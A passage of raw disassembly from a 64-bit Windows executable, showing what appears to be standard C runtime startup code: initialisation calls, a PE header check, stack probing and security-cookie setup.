   140006dd9:	e8 3e 07 00 00       	call   0x14000751c
   140006dde:	8b c8                	mov    %eax,%ecx
   140006de0:	e8 ef 0d 00 00       	call   0x140007bd4
   140006de5:	85 c0                	test   %eax,%eax
   140006de7:	75 52                	jne    0x140006e3b
   140006de9:	e8 3e 07 00 00       	call   0x14000752c
   140006dee:	e8 71 07 00 00       	call   0x140007564
   140006df3:	85 c0                	test   %eax,%eax
   140006df5:	74 0c                	je     0x140006e03
   140006df7:	48 8d 0d 1a 07 00 00 	lea    0x71a(%rip),%rcx        # 0x140007518
   140006dfe:	e8 cb 0d 00 00       	call   0x140007bce
   140006e03:	e8 34 04 00 00       	call   0x14000723c
   140006e08:	e8 2f 04 00 00       	call   0x14000723c
   140006e0d:	e8 06 07 00 00       	call   0x140007518
   140006e12:	8b c8                	mov    %eax,%ecx
   140006e14:	e8 fd 0d 00 00       	call   0x140007c16
   140006e19:	e8 1e 07 00 00       	call   0x14000753c
   140006e1e:	84 c0                	test   %al,%al
   140006e20:	74 05                	je     0x140006e27
   140006e22:	e8 b3 0d 00 00       	call   0x140007bda
   140006e27:	e8 ec 06 00 00       	call   0x140007518
   140006e2c:	e8 e3 08 00 00       	call   0x140007714
   140006e31:	85 c0                	test   %eax,%eax
   140006e33:	75 06                	jne    0x140006e3b
   140006e35:	48 83 c4 20          	add    $0x20,%rsp
   140006e39:	5b                   	pop    %rbx
   140006e3a:	c3                   	ret
   140006e3b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006e40:	e8 47 07 00 00       	call   0x14000758c
   140006e45:	cc                   	int3
   140006e46:	cc                   	int3
   140006e47:	cc                   	int3
   140006e48:	48 83 ec 28          	sub    $0x28,%rsp
   140006e4c:	e8 f7 06 00 00       	call   0x140007548
   140006e51:	33 c0                	xor    %eax,%eax
   140006e53:	48 83 c4 28          	add    $0x28,%rsp
   140006e57:	c3                   	ret
   140006e58:	48 83 ec 28          	sub    $0x28,%rsp
   140006e5c:	e8 0f 09 00 00       	call   0x140007770
   140006e61:	e8 b2 06 00 00       	call   0x140007518
   140006e66:	8b c8                	mov    %eax,%ecx
   140006e68:	48 83 c4 28          	add    $0x28,%rsp
   140006e6c:	e9 ab 0d 00 00       	jmp    0x140007c1c
   140006e71:	cc                   	int3
   140006e72:	cc                   	int3
   140006e73:	cc                   	int3
   140006e74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006e79:	57                   	push   %rdi
   140006e7a:	48 83 ec 30          	sub    $0x30,%rsp
   140006e7e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006e83:	e8 b0 01 00 00       	call   0x140007038
   140006e88:	84 c0                	test   %al,%al
   140006e8a:	0f 84 30 01 00 00    	je     0x140006fc0
   140006e90:	40 32 ff             	xor    %dil,%dil
   140006e93:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140006e98:	e8 5f 01 00 00       	call   0x140006ffc
   140006e9d:	8a d8                	mov    %al,%bl
   140006e9f:	8b 0d eb 74 00 00    	mov    0x74eb(%rip),%ecx        # 0x14000e390
   140006ea5:	83 f9 01             	cmp    $0x1,%ecx
   140006ea8:	0f 84 1d 01 00 00    	je     0x140006fcb
   140006eae:	85 c9                	test   %ecx,%ecx
   140006eb0:	75 4a                	jne    0x140006efc
   140006eb2:	c7 05 d4 74 00 00 01 	movl   $0x1,0x74d4(%rip)        # 0x14000e390
   140006eb9:	00 00 00 
   140006ebc:	48 8d 15 ed 27 00 00 	lea    0x27ed(%rip),%rdx        # 0x1400096b0
   140006ec3:	48 8d 0d ce 27 00 00 	lea    0x27ce(%rip),%rcx        # 0x140009698
   140006eca:	e8 1d 0d 00 00       	call   0x140007bec
   140006ecf:	85 c0                	test   %eax,%eax
   140006ed1:	74 0a                	je     0x140006edd
   140006ed3:	b8 ff 00 00 00       	mov    $0xff,%eax
   140006ed8:	e9 d8 00 00 00       	jmp    0x140006fb5
   140006edd:	48 8d 15 ac 27 00 00 	lea    0x27ac(%rip),%rdx        # 0x140009690
   140006ee4:	48 8d 0d 8d 27 00 00 	lea    0x278d(%rip),%rcx        # 0x140009678
   140006eeb:	e8 f6 0c 00 00       	call   0x140007be6
   140006ef0:	c7 05 96 74 00 00 02 	movl   $0x2,0x7496(%rip)        # 0x14000e390
   140006ef7:	00 00 00 
   140006efa:	eb 08                	jmp    0x140006f04
   140006efc:	40 b7 01             	mov    $0x1,%dil
   140006eff:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140006f04:	8a cb                	mov    %bl,%cl
   140006f06:	e8 8d 02 00 00       	call   0x140007198
   140006f0b:	e8 60 06 00 00       	call   0x140007570
   140006f10:	48 8b d8             	mov    %rax,%rbx
   140006f13:	48 83 38 00          	cmpq   $0x0,(%rax)
   140006f17:	74 1e                	je     0x140006f37
   140006f19:	48 8b c8             	mov    %rax,%rcx
   140006f1c:	e8 df 01 00 00       	call   0x140007100
   140006f21:	84 c0                	test   %al,%al
   140006f23:	74 12                	je     0x140006f37
   140006f25:	45 33 c0             	xor    %r8d,%r8d
   140006f28:	41 8d 50 02          	lea    0x2(%r8),%edx
   140006f2c:	33 c9                	xor    %ecx,%ecx
   140006f2e:	48 8b 03             	mov    (%rbx),%rax
   140006f31:	ff 15 19 27 00 00    	call   *0x2719(%rip)        # 0x140009650
   140006f37:	e8 3c 06 00 00       	call   0x140007578
   140006f3c:	48 8b d8             	mov    %rax,%rbx
   140006f3f:	48 83 38 00          	cmpq   $0x0,(%rax)
   140006f43:	74 14                	je     0x140006f59
   140006f45:	48 8b c8             	mov    %rax,%rcx
   140006f48:	e8 b3 01 00 00       	call   0x140007100
   140006f4d:	84 c0                	test   %al,%al
   140006f4f:	74 08                	je     0x140006f59
   140006f51:	48 8b 0b             	mov    (%rbx),%rcx
   140006f54:	e8 b7 0c 00 00       	call   0x140007c10
   140006f59:	e8 7a 07 00 00       	call   0x1400076d8
   140006f5e:	0f b7 d8             	movzwl %ax,%ebx
   140006f61:	e8 7a 0c 00 00       	call   0x140007be0
   140006f66:	44 8b cb             	mov    %ebx,%r9d
   140006f69:	4c 8b c0             	mov    %rax,%r8
   140006f6c:	33 d2                	xor    %edx,%edx
   140006f6e:	48 8d 0d 8b 90 ff ff 	lea    -0x6f75(%rip),%rcx        # 0x140000000
   140006f75:	e8 c6 cb ff ff       	call   0x140003b40
   140006f7a:	8b d8                	mov    %eax,%ebx
   140006f7c:	e8 9b 07 00 00       	call   0x14000771c
   140006f81:	84 c0                	test   %al,%al
   140006f83:	74 50                	je     0x140006fd5
   140006f85:	40 84 ff             	test   %dil,%dil
   140006f88:	75 05                	jne    0x140006f8f
   140006f8a:	e8 75 0c 00 00       	call   0x140007c04
   140006f8f:	33 d2                	xor    %edx,%edx
   140006f91:	b1 01                	mov    $0x1,%cl
   140006f93:	e8 24 02 00 00       	call   0x1400071bc
   140006f98:	8b c3                	mov    %ebx,%eax
   140006f9a:	eb 19                	jmp    0x140006fb5
   140006f9c:	8b d8                	mov    %eax,%ebx
   140006f9e:	e8 79 07 00 00       	call   0x14000771c
   140006fa3:	84 c0                	test   %al,%al
   140006fa5:	74 36                	je     0x140006fdd
   140006fa7:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140006fac:	75 05                	jne    0x140006fb3
   140006fae:	e8 57 0c 00 00       	call   0x140007c0a
   140006fb3:	8b c3                	mov    %ebx,%eax
   140006fb5:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006fba:	48 83 c4 30          	add    $0x30,%rsp
   140006fbe:	5f                   	pop    %rdi
   140006fbf:	c3                   	ret
   140006fc0:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006fc5:	e8 c2 05 00 00       	call   0x14000758c
   140006fca:	90                   	nop
   140006fcb:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006fd0:	e8 b7 05 00 00       	call   0x14000758c
   140006fd5:	8b cb                	mov    %ebx,%ecx
   140006fd7:	e8 16 0c 00 00       	call   0x140007bf2
   140006fdc:	90                   	nop
   140006fdd:	8b cb                	mov    %ebx,%ecx
   140006fdf:	e8 14 0c 00 00       	call   0x140007bf8
   140006fe4:	90                   	nop
   140006fe5:	cc                   	int3
   140006fe6:	cc                   	int3
   140006fe7:	cc                   	int3
   140006fe8:	48 83 ec 28          	sub    $0x28,%rsp
   140006fec:	e8 77 04 00 00       	call   0x140007468
   140006ff1:	48 83 c4 28          	add    $0x28,%rsp
   140006ff5:	e9 7a fe ff ff       	jmp    0x140006e74
   140006ffa:	cc                   	int3
   140006ffb:	cc                   	int3
   140006ffc:	48 83 ec 28          	sub    $0x28,%rsp
   140007000:	e8 ef 0a 00 00       	call   0x140007af4
   140007005:	85 c0                	test   %eax,%eax
   140007007:	74 21                	je     0x14000702a
   140007009:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140007010:	00 00 
   140007012:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140007016:	eb 05                	jmp    0x14000701d
   140007018:	48 3b c8             	cmp    %rax,%rcx
   14000701b:	74 14                	je     0x140007031
   14000701d:	33 c0                	xor    %eax,%eax
   14000701f:	f0 48 0f b1 0d 70 73 	lock cmpxchg %rcx,0x7370(%rip)        # 0x14000e398
   140007026:	00 00 
   140007028:	75 ee                	jne    0x140007018
   14000702a:	32 c0                	xor    %al,%al
   14000702c:	48 83 c4 28          	add    $0x28,%rsp
   140007030:	c3                   	ret
   140007031:	b0 01                	mov    $0x1,%al
   140007033:	eb f7                	jmp    0x14000702c
   140007035:	cc                   	int3
   140007036:	cc                   	int3
   140007037:	cc                   	int3
   140007038:	48 83 ec 28          	sub    $0x28,%rsp
   14000703c:	85 c9                	test   %ecx,%ecx
   14000703e:	75 07                	jne    0x140007047
   140007040:	c6 05 59 73 00 00 01 	movb   $0x1,0x7359(%rip)        # 0x14000e3a0
   140007047:	e8 10 08 00 00       	call   0x14000785c
   14000704c:	e8 eb 04 00 00       	call   0x14000753c
   140007051:	84 c0                	test   %al,%al
   140007053:	75 04                	jne    0x140007059
   140007055:	32 c0                	xor    %al,%al
   140007057:	eb 14                	jmp    0x14000706d
   140007059:	e8 de 04 00 00       	call   0x14000753c
   14000705e:	84 c0                	test   %al,%al
   140007060:	75 09                	jne    0x14000706b
   140007062:	33 c9                	xor    %ecx,%ecx
   140007064:	e8 d3 04 00 00       	call   0x14000753c
   140007069:	eb ea                	jmp    0x140007055
   14000706b:	b0 01                	mov    $0x1,%al
   14000706d:	48 83 c4 28          	add    $0x28,%rsp
   140007071:	c3                   	ret
   140007072:	cc                   	int3
   140007073:	cc                   	int3
   140007074:	40 53                	rex push %rbx
   140007076:	48 83 ec 20          	sub    $0x20,%rsp
   14000707a:	80 3d 20 73 00 00 00 	cmpb   $0x0,0x7320(%rip)        # 0x14000e3a1
   140007081:	8b d9                	mov    %ecx,%ebx
   140007083:	75 67                	jne    0x1400070ec
   140007085:	83 f9 01             	cmp    $0x1,%ecx
   140007088:	77 6a                	ja     0x1400070f4
   14000708a:	e8 65 0a 00 00       	call   0x140007af4
   14000708f:	85 c0                	test   %eax,%eax
   140007091:	74 28                	je     0x1400070bb
   140007093:	85 db                	test   %ebx,%ebx
   140007095:	75 24                	jne    0x1400070bb
   140007097:	48 8d 0d 0a 73 00 00 	lea    0x730a(%rip),%rcx        # 0x14000e3a8
   14000709e:	e8 85 0b 00 00       	call   0x140007c28
   1400070a3:	85 c0                	test   %eax,%eax
   1400070a5:	75 10                	jne    0x1400070b7
   1400070a7:	48 8d 0d 12 73 00 00 	lea    0x7312(%rip),%rcx        # 0x14000e3c0
   1400070ae:	e8 75 0b 00 00       	call   0x140007c28
   1400070b3:	85 c0                	test   %eax,%eax
   1400070b5:	74 2e                	je     0x1400070e5
   1400070b7:	32 c0                	xor    %al,%al
   1400070b9:	eb 33                	jmp    0x1400070ee
   1400070bb:	66 0f 6f 05 6d 26 00 	movdqa 0x266d(%rip),%xmm0        # 0x140009730
   1400070c2:	00 
   1400070c3:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400070c7:	f3 0f 7f 05 d9 72 00 	movdqu %xmm0,0x72d9(%rip)        # 0x14000e3a8
   1400070ce:	00 
   1400070cf:	48 89 05 e2 72 00 00 	mov    %rax,0x72e2(%rip)        # 0x14000e3b8
   1400070d6:	f3 0f 7f 05 e2 72 00 	movdqu %xmm0,0x72e2(%rip)        # 0x14000e3c0
   1400070dd:	00 
   1400070de:	48 89 05 eb 72 00 00 	mov    %rax,0x72eb(%rip)        # 0x14000e3d0
   1400070e5:	c6 05 b5 72 00 00 01 	movb   $0x1,0x72b5(%rip)        # 0x14000e3a1
   1400070ec:	b0 01                	mov    $0x1,%al
   1400070ee:	48 83 c4 20          	add    $0x20,%rsp
   1400070f2:	5b                   	pop    %rbx
   1400070f3:	c3                   	ret
   1400070f4:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400070f9:	e8 8e 04 00 00       	call   0x14000758c
   1400070fe:	cc                   	int3
   1400070ff:	cc                   	int3
   140007100:	48 83 ec 18          	sub    $0x18,%rsp
   140007104:	4c 8b c1             	mov    %rcx,%r8
   140007107:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   14000710c:	66 39 05 ed 8e ff ff 	cmp    %ax,-0x7113(%rip)        # 0x140000000
   140007113:	75 78                	jne    0x14000718d
   140007115:	48 63 0d 20 8f ff ff 	movslq -0x70e0(%rip),%rcx        # 0x14000003c
   14000711c:	48 8d 15 dd 8e ff ff 	lea    -0x7123(%rip),%rdx        # 0x140000000
   140007123:	48 03 ca             	add    %rdx,%rcx
   140007126:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   14000712c:	75 5f                	jne    0x14000718d
   14000712e:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140007133:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140007137:	75 54                	jne    0x14000718d
   140007139:	4c 2b c2             	sub    %rdx,%r8
   14000713c:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140007140:	48 83 c2 18          	add    $0x18,%rdx
   140007144:	48 03 d1             	add    %rcx,%rdx
   140007147:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000714b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000714f:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140007153:	48 89 14 24          	mov    %rdx,(%rsp)
   140007157:	49 3b d1             	cmp    %r9,%rdx
   14000715a:	74 18                	je     0x140007174
   14000715c:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   14000715f:	4c 3b c1             	cmp    %rcx,%r8
   140007162:	72 0a                	jb     0x14000716e
   140007164:	8b 42 08             	mov    0x8(%rdx),%eax
   140007167:	03 c1                	add    %ecx,%eax
   140007169:	4c 3b c0             	cmp    %rax,%r8
   14000716c:	72 08                	jb     0x140007176
   14000716e:	48 83 c2 28          	add    $0x28,%rdx
   140007172:	eb df                	jmp    0x140007153
   140007174:	33 d2                	xor    %edx,%edx
   140007176:	48 85 d2             	test   %rdx,%rdx
   140007179:	75 04                	jne    0x14000717f
   14000717b:	32 c0                	xor    %al,%al
   14000717d:	eb 14                	jmp    0x140007193
   14000717f:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140007183:	7d 04                	jge    0x140007189
   140007185:	32 c0                	xor    %al,%al
   140007187:	eb 0a                	jmp    0x140007193
   140007189:	b0 01                	mov    $0x1,%al
   14000718b:	eb 06                	jmp    0x140007193
   14000718d:	32 c0                	xor    %al,%al
   14000718f:	eb 02                	jmp    0x140007193
   140007191:	32 c0                	xor    %al,%al
   140007193:	48 83 c4 18          	add    $0x18,%rsp
   140007197:	c3                   	ret
   140007198:	40 53                	rex push %rbx
   14000719a:	48 83 ec 20          	sub    $0x20,%rsp
   14000719e:	8a d9                	mov    %cl,%bl
   1400071a0:	e8 4f 09 00 00       	call   0x140007af4
   1400071a5:	33 d2                	xor    %edx,%edx
   1400071a7:	85 c0                	test   %eax,%eax
   1400071a9:	74 0b                	je     0x1400071b6
   1400071ab:	84 db                	test   %bl,%bl
   1400071ad:	75 07                	jne    0x1400071b6
   1400071af:	48 87 15 e2 71 00 00 	xchg   %rdx,0x71e2(%rip)        # 0x14000e398
   1400071b6:	48 83 c4 20          	add    $0x20,%rsp
   1400071ba:	5b                   	pop    %rbx
   1400071bb:	c3                   	ret
   1400071bc:	40 53                	rex push %rbx
   1400071be:	48 83 ec 20          	sub    $0x20,%rsp
   1400071c2:	80 3d d7 71 00 00 00 	cmpb   $0x0,0x71d7(%rip)        # 0x14000e3a0
   1400071c9:	8a d9                	mov    %cl,%bl
   1400071cb:	74 04                	je     0x1400071d1
   1400071cd:	84 d2                	test   %dl,%dl
   1400071cf:	75 0c                	jne    0x1400071dd
   1400071d1:	e8 66 03 00 00       	call   0x14000753c
   1400071d6:	8a cb                	mov    %bl,%cl
   1400071d8:	e8 5f 03 00 00       	call   0x14000753c
   1400071dd:	b0 01                	mov    $0x1,%al
   1400071df:	48 83 c4 20          	add    $0x20,%rsp
   1400071e3:	5b                   	pop    %rbx
   1400071e4:	c3                   	ret
   1400071e5:	cc                   	int3
   1400071e6:	cc                   	int3
   1400071e7:	cc                   	int3
   1400071e8:	40 53                	rex push %rbx
   1400071ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400071ee:	48 83 3d b2 71 00 00 	cmpq   $0xffffffffffffffff,0x71b2(%rip)        # 0x14000e3a8
   1400071f5:	ff 
   1400071f6:	48 8b d9             	mov    %rcx,%rbx
   1400071f9:	75 07                	jne    0x140007202
   1400071fb:	e8 34 0a 00 00       	call   0x140007c34
   140007200:	eb 0f                	jmp    0x140007211
   140007202:	48 8b d3             	mov    %rbx,%rdx
   140007205:	48 8d 0d 9c 71 00 00 	lea    0x719c(%rip),%rcx        # 0x14000e3a8
   14000720c:	e8 1d 0a 00 00       	call   0x140007c2e
   140007211:	33 d2                	xor    %edx,%edx
   140007213:	85 c0                	test   %eax,%eax
   140007215:	48 0f 44 d3          	cmove  %rbx,%rdx
   140007219:	48 8b c2             	mov    %rdx,%rax
   14000721c:	48 83 c4 20          	add    $0x20,%rsp
   140007220:	5b                   	pop    %rbx
   140007221:	c3                   	ret
   140007222:	cc                   	int3
   140007223:	cc                   	int3
   140007224:	48 83 ec 28          	sub    $0x28,%rsp
   140007228:	e8 bb ff ff ff       	call   0x1400071e8
   14000722d:	48 f7 d8             	neg    %rax
   140007230:	1b c0                	sbb    %eax,%eax
   140007232:	f7 d8                	neg    %eax
   140007234:	ff c8                	dec    %eax
   140007236:	48 83 c4 28          	add    $0x28,%rsp
   14000723a:	c3                   	ret
   14000723b:	cc                   	int3
   14000723c:	c2 00 00             	ret    $0x0
   14000723f:	cc                   	int3
   140007240:	cc                   	int3
   140007241:	cc                   	int3
   140007242:	cc                   	int3
   140007243:	cc                   	int3
   140007244:	cc                   	int3
   140007245:	cc                   	int3
   140007246:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000724d:	00 00 00 
   140007250:	48 83 ec 10          	sub    $0x10,%rsp
   140007254:	4c 89 14 24          	mov    %r10,(%rsp)
   140007258:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000725d:	4d 33 db             	xor    %r11,%r11
   140007260:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   140007265:	4c 2b d0             	sub    %rax,%r10
   140007268:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000726c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   140007273:	00 00 
   140007275:	4d 3b d3             	cmp    %r11,%r10
   140007278:	73 16                	jae    0x140007290
   14000727a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   140007280:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   140007287:	41 c6 03 00          	movb   $0x0,(%r11)
   14000728b:	4d 3b d3             	cmp    %r11,%r10
   14000728e:	75 f0                	jne    0x140007280
   140007290:	4c 8b 14 24          	mov    (%rsp),%r10
   140007294:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   140007299:	48 83 c4 10          	add    $0x10,%rsp
   14000729d:	c3                   	ret
   14000729e:	cc                   	int3
   14000729f:	cc                   	int3
   1400072a0:	40 53                	rex push %rbx
   1400072a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400072a6:	48 8b d9             	mov    %rcx,%rbx
   1400072a9:	33 c9                	xor    %ecx,%ecx
   1400072ab:	ff 15 ff 1d 00 00    	call   *0x1dff(%rip)        # 0x1400090b0
   1400072b1:	48 8b cb             	mov    %rbx,%rcx
   1400072b4:	ff 15 fe 1d 00 00    	call   *0x1dfe(%rip)        # 0x1400090b8
   1400072ba:	ff 15 50 1e 00 00    	call   *0x1e50(%rip)        # 0x140009110
   1400072c0:	48 8b c8             	mov    %rax,%rcx
   1400072c3:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   1400072c8:	48 83 c4 20          	add    $0x20,%rsp
   1400072cc:	5b                   	pop    %rbx
   1400072cd:	48 ff 25 cc 1d 00 00 	rex.W jmp *0x1dcc(%rip)        # 0x1400090a0
   1400072d4:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400072d9:	48 83 ec 38          	sub    $0x38,%rsp
   1400072dd:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400072e2:	ff 15 b0 1d 00 00    	call   *0x1db0(%rip)        # 0x140009098
   1400072e8:	85 c0                	test   %eax,%eax
   1400072ea:	74 07                	je     0x1400072f3
   1400072ec:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400072f1:	cd 29                	int    $0x29
   1400072f3:	48 8d 0d 86 71 00 00 	lea    0x7186(%rip),%rcx        # 0x14000e480
   1400072fa:	e8 a9 00 00 00       	call   0x1400073a8
   1400072ff:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140007304:	48 89 05 6d 72 00 00 	mov    %rax,0x726d(%rip)        # 0x14000e578
   14000730b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140007310:	48 83 c0 08          	add    $0x8,%rax
   140007314:	48 89 05 fd 71 00 00 	mov    %rax,0x71fd(%rip)        # 0x14000e518
   14000731b:	48 8b 05 56 72 00 00 	mov    0x7256(%rip),%rax        # 0x14000e578
   140007322:	48 89 05 c7 70 00 00 	mov    %rax,0x70c7(%rip)        # 0x14000e3f0
   140007329:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000732e:	48 89 05 cb 71 00 00 	mov    %rax,0x71cb(%rip)        # 0x14000e500
   140007335:	c7 05 a1 70 00 00 09 	movl   $0xc0000409,0x70a1(%rip)        # 0x14000e3e0
   14000733c:	04 00 c0 
   14000733f:	c7 05 9b 70 00 00 01 	movl   $0x1,0x709b(%rip)        # 0x14000e3e4
   140007346:	00 00 00 
   140007349:	c7 05 a5 70 00 00 01 	movl   $0x1,0x70a5(%rip)        # 0x14000e3f8
   140007350:	00 00 00 
   140007353:	b8 08 00 00 00       	mov    $0x8,%eax
   140007358:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000735c:	48 8d 0d 9d 70 00 00 	lea    0x709d(%rip),%rcx        # 0x14000e400
   140007363:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   14000736a:	00 
   14000736b:	b8 08 00 00 00       	mov    $0x8,%eax
   140007370:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140007374:	48 8b 0d c5 6c 00 00 	mov    0x6cc5(%rip),%rcx        # 0x14000e040
   14000737b:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140007380:	b8 08 00 00 00       	mov    $0x8,%eax
   140007385:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140007389:	48 8b 0d f0 6c 00 00 	mov    0x6cf0(%rip),%rcx        # 0x14000e080
   140007390:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140007395:	48 8d 0d a4 23 00 00 	lea    0x23a4(%rip),%rcx        # 0x140009740
   14000739c:	e8 ff fe ff ff       	call   0x1400072a0
   1400073a1:	90                   	nop
   1400073a2:	48 83 c4 38          	add    $0x38,%rsp
   1400073a6:	c3                   	ret
   1400073a7:	cc                   	int3
   1400073a8:	40 53                	rex push %rbx
   1400073aa:	56                   	push   %rsi
   1400073ab:	57                   	push   %rdi
   1400073ac:	48 83 ec 40          	sub    $0x40,%rsp
   1400073b0:	48 8b d9             	mov    %rcx,%rbx
   1400073b3:	ff 15 17 1d 00 00    	call   *0x1d17(%rip)        # 0x1400090d0
   1400073b9:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   1400073c0:	33 ff                	xor    %edi,%edi
   1400073c2:	45 33 c0             	xor    %r8d,%r8d
   1400073c5:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400073ca:	48 8b ce             	mov    %rsi,%rcx
   1400073cd:	ff 15 f5 1c 00 00    	call   *0x1cf5(%rip)        # 0x1400090c8
   1400073d3:	48 85 c0             	test   %rax,%rax
   1400073d6:	74 3c                	je     0x140007414
   1400073d8:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400073dd:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1400073e2:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400073e9:	00 00 
   1400073eb:	4c 8b c8             	mov    %rax,%r9
   1400073ee:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400073f3:	4c 8b c6             	mov    %rsi,%r8
   1400073f6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400073fb:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140007400:	33 c9                	xor    %ecx,%ecx
   140007402:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007407:	ff 15 b3 1c 00 00    	call   *0x1cb3(%rip)        # 0x1400090c0
   14000740d:	ff c7                	inc    %edi
   14000740f:	83 ff 02             	cmp    $0x2,%edi
   140007412:	7c ae                	jl     0x1400073c2
   140007414:	48 83 c4 40          	add    $0x40,%rsp
   140007418:	5f                   	pop    %rdi
   140007419:	5e                   	pop    %rsi
   14000741a:	5b                   	pop    %rbx
   14000741b:	c3                   	ret
   14000741c:	e9 8f 07 00 00       	jmp    0x140007bb0
   140007421:	cc                   	int3
   140007422:	cc                   	int3
   140007423:	cc                   	int3
   140007424:	48 8d 05 55 23 00 00 	lea    0x2355(%rip),%rax        # 0x140009780
   14000742b:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140007432:	00 
   140007433:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140007437:	48 8d 05 32 23 00 00 	lea    0x2332(%rip),%rax        # 0x140009770
   14000743e:	48 89 01             	mov    %rax,(%rcx)
   140007441:	48 8b c1             	mov    %rcx,%rax
   140007444:	c3                   	ret
   140007445:	cc                   	int3
   140007446:	cc                   	int3
   140007447:	cc                   	int3
   140007448:	48 83 ec 48          	sub    $0x48,%rsp
   14000744c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007451:	e8 ce ff ff ff       	call   0x140007424
   140007456:	48 8d 15 3b 45 00 00 	lea    0x453b(%rip),%rdx        # 0x14000b998
   14000745d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007462:	e8 25 07 00 00       	call   0x140007b8c
   140007467:	cc                   	int3
   140007468:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000746d:	55                   	push   %rbp
   14000746e:	48 8b ec             	mov    %rsp,%rbp
   140007471:	48 83 ec 30          	sub    $0x30,%rsp
   140007475:	48 8b 05 c4 6b 00 00 	mov    0x6bc4(%rip),%rax        # 0x14000e040
   14000747c:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140007483:	2b 00 00 
   140007486:	48 3b c3             	cmp    %rbx,%rax
   140007489:	75 77                	jne    0x140007502
   14000748b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000748f:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   140007496:	00 
   140007497:	ff 15 e3 1b 00 00    	call   *0x1be3(%rip)        # 0x140009080
   14000749d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400074a1:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400074a5:	ff 15 35 1c 00 00    	call   *0x1c35(%rip)        # 0x1400090e0
   1400074ab:	8b c0                	mov    %eax,%eax
   1400074ad:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400074b1:	ff 15 d1 1b 00 00    	call   *0x1bd1(%rip)        # 0x140009088
   1400074b7:	8b c0                	mov    %eax,%eax
   1400074b9:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1400074bd:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400074c1:	ff 15 c9 1b 00 00    	call   *0x1bc9(%rip)        # 0x140009090
   1400074c7:	8b 45 18             	mov    0x18(%rbp),%eax
   1400074ca:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400074ce:	48 c1 e0 20          	shl    $0x20,%rax
   1400074d2:	48 33 45 18          	xor    0x18(%rbp),%rax
   1400074d6:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   1400074da:	48 33 c1             	xor    %rcx,%rax
   1400074dd:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   1400074e4:	ff 00 00 
   1400074e7:	48 23 c1             	and    %rcx,%rax
   1400074ea:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   1400074f1:	2b 00 00 
   1400074f4:	48 3b c3             	cmp    %rbx,%rax
   1400074f7:	48 0f 44 c1          	cmove  %rcx,%rax
   1400074fb:	48 89 05 3e 6b 00 00 	mov    %rax,0x6b3e(%rip)        # 0x14000e040
